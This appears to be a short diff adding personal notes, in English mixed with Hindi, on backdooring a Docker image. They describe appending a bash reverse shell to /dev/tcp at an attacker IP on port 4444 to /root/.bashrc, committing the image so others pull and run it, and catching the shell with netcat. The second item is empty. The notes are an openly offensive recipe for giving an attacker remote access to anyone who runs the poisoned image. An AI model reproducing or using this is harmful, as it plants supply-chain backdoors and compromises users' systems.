@@ -1,0 +1,8 @@
+1) if we add one image and add a command and create a new image and the attacter is listering on port 4444
+    for target machine:
+      - in ubuntu docker image
+      - echo "/bin/bash -i &> /dev/tcp/172.168.42.189(attacker_ip)/4444(port) 0>&1" >> /root/.bashrc
+      - make one commit and let any one pull and run this then on attacker machine run: netcat -lvp 4444
+      - jb he koi se container start karega you will get aacess.
+
+2) 
